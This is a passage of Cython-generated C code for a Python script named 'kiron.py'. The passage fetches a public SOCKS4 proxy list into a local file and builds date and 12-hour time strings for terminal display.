      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 54, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "kiron.py":52
 *  if se in redmi:pass
 *  else:redmi.append(se)
 * try:             # <<<<<<<<<<<<<<
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 *   open('socksku.txt','w').write(proxylist)
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L25_try_end;
    __pyx_L20_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "kiron.py":55
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 *   open('socksku.txt','w').write(proxylist)
 * except Exception as e:             # <<<<<<<<<<<<<<
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')
 * proxsi=open('socksku.txt','r').read().splitlines()
 */
    __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_9) {
      __Pyx_AddTraceback("kiron", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_7, &__pyx_t_2) < 0) __PYX_ERR(0, 55, __pyx_L22_except_error)
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_t_7) < 0) __PYX_ERR(0, 55, __pyx_L22_except_error)
      /*try:*/ {

        /* "kiron.py":56
 *   open('socksku.txt','w').write(proxylist)
 * except Exception as e:
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')             # <<<<<<<<<<<<<<
 * proxsi=open('socksku.txt','r').read().splitlines()
 * #__________________[ date ]__________________#
 */
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__111, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 56, __pyx_L31_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      }

      /* "kiron.py":55
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 *   open('socksku.txt','w').write(proxylist)
 * except Exception as e:             # <<<<<<<<<<<<<<
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')
 * proxsi=open('socksku.txt','r').read().splitlines()
 */
      /*finally:*/ {
        /*normal exit:*/{
          if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 55, __pyx_L22_except_error) }
          goto __pyx_L32;
        }
        __pyx_L31_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0; __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_20, &__pyx_t_21, &__pyx_t_22);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19) < 0)) __Pyx_ErrFetch(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_20);
          __Pyx_XGOTREF(__pyx_t_21);
          __Pyx_XGOTREF(__pyx_t_22);
          __pyx_t_9 = __pyx_lineno; __pyx_t_15 = __pyx_clineno; __pyx_t_16 = __pyx_filename;
          {
            if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 55, __pyx_L36_error) }
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_XGIVEREF(__pyx_t_21);
            __Pyx_XGIVEREF(__pyx_t_22);
            __Pyx_ExceptionReset(__pyx_t_20, __pyx_t_21, __pyx_t_22);
          }
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_XGIVEREF(__pyx_t_19);
          __Pyx_ErrRestore(__pyx_t_17, __pyx_t_18, __pyx_t_19);
          __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0; __pyx_t_22 = 0;
          __pyx_lineno = __pyx_t_9; __pyx_clineno = __pyx_t_15; __pyx_filename = __pyx_t_16;
          goto __pyx_L22_except_error;
          __pyx_L36_error:;
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_XGIVEREF(__pyx_t_21);
            __Pyx_XGIVEREF(__pyx_t_22);
            __Pyx_ExceptionReset(__pyx_t_20, __pyx_t_21, __pyx_t_22);
          }
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          __pyx_t_20 = 0; __pyx_t_21 = 0; __pyx_t_22 = 0;
          goto __pyx_L22_except_error;
        }
        __pyx_L32:;
      }
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L21_exception_handled;
    }
    goto __pyx_L22_except_error;

    /* "kiron.py":52
 *  if se in redmi:pass
 *  else:redmi.append(se)
 * try:             # <<<<<<<<<<<<<<
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 *   open('socksku.txt','w').write(proxylist)
 */
    __pyx_L22_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_5, __pyx_t_6);
    goto __pyx_L1_error;
    __pyx_L21_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_5, __pyx_t_6);
    __pyx_L25_try_end:;
  }

  /* "kiron.py":57
 * except Exception as e:
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')
 * proxsi=open('socksku.txt','r').read().splitlines()             # <<<<<<<<<<<<<<
 * #__________________[ date ]__________________#
 * dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 */
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__112, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_read); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_proxsi, __pyx_t_2) < 0) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":59
 * proxsi=open('socksku.txt','r').read().splitlines()
 * #__________________[ date ]__________________#
 * dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}             # <<<<<<<<<<<<<<
 * dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 * tgl = datetime.datetime.now().day
 */
  __pyx_t_2 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_1, __pyx_n_s_January) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_2, __pyx_n_s_February) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_3, __pyx_n_s_March) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_4, __pyx_n_s_April) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_5, __pyx_n_s_May) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_6, __pyx_n_s_June) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_7, __pyx_n_s_July) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_8, __pyx_n_s_August) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_9, __pyx_n_s_September) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_10, __pyx_n_s_October) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_11, __pyx_n_s_November) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_12, __pyx_n_s_December) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_dic, __pyx_t_2) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":60
 * #__________________[ date ]__________________#
 * dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 * dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}             # <<<<<<<<<<<<<<
 * tgl = datetime.datetime.now().day
 * bln = dic[(str(datetime.datetime.now().month))]
 */
  __pyx_t_2 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_01, __pyx_n_s_January) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_02, __pyx_n_s_February) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_03, __pyx_n_s_March) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_04, __pyx_n_s_April) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_05, __pyx_n_s_May) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_06, __pyx_n_s_June) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_07, __pyx_n_s_July) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_08, __pyx_n_s_August) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_09, __pyx_n_s_September) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_10, __pyx_n_s_October) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_11, __pyx_n_s_November) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_12, __pyx_n_s_Devember) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_dic2, __pyx_t_2) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":61
 * dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 * dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 * tgl = datetime.datetime.now().day             # <<<<<<<<<<<<<<
 * bln = dic[(str(datetime.datetime.now().month))]
 * thn = datetime.datetime.now().year
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_now); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_day); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tgl, __pyx_t_2) < 0) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":62
 * dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 * tgl = datetime.datetime.now().day
 * bln = dic[(str(datetime.datetime.now().month))]             # <<<<<<<<<<<<<<
 * thn = datetime.datetime.now().year
 * date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_dic); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_now); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_month); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetItem(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bln, __pyx_t_7) < 0) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":63
 * tgl = datetime.datetime.now().day
 * bln = dic[(str(datetime.datetime.now().month))]
 * thn = datetime.datetime.now().year             # <<<<<<<<<<<<<<
 * date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
 * ltx = int(lt()[3])
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_now); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_year); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_thn, __pyx_t_7) < 0) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":64
 * bln = dic[(str(datetime.datetime.now().month))]
 * thn = datetime.datetime.now().year
 * date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)             # <<<<<<<<<<<<<<
 * ltx = int(lt()[3])
 * if ltx > 12:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_tgl); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_38_5_244m_38_5_46m_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_bln); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_7, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_kp_s_38_5_244m_38_5_46m_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_thn); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_3) < 0) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":65
 * thn = datetime.datetime.now().year
 * date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
 * ltx = int(lt()[3])             # <<<<<<<<<<<<<<
 * if ltx > 12:
 *     a = ltx-12
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_lt); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_GetItemInt(__pyx_t_7, 3, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyNumber_Int(__pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ltx, __pyx_t_7) < 0) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":66
 * date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
 * ltx = int(lt()[3])
 * if ltx > 12:             # <<<<<<<<<<<<<<
 *     a = ltx-12
 *     tag = "PM"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ltx); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_3 = PyObject_RichCompare(__pyx_t_7, __pyx_int_12, Py_GT); __Pyx_XGOTREF(__pyx_t_3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__pyx_t_4) {

    /* "kiron.py":67
 * ltx = int(lt()[3])
 * if ltx > 12:
 *     a = ltx-12             # <<<<<<<<<<<<<<
 *     tag = "PM"
 * else:
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_ltx); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 67, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_7 = __Pyx_PyInt_SubtractObjC(__pyx_t_3, __pyx_int_12, 12, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 67, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_a, __pyx_t_7) < 0) __PYX_ERR(0, 67, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "kiron.py":68
 * if ltx > 12:
 *     a = ltx-12
 *     tag = "PM"             # <<<<<<<<<<<<<<
 * else:
 *     a = ltx
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_tag, __pyx_n_s_PM) < 0) __PYX_ERR(0, 68, __pyx_L1_error)

    /* "kiron.py":66
 * date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
 * ltx = int(lt()[3])
 * if ltx > 12:             # <<<<<<<<<<<<<<
 *     a = ltx-12
 *     tag = "PM"
 */
    goto __pyx_L37;
  }

  /* "kiron.py":70
 *     tag = "PM"
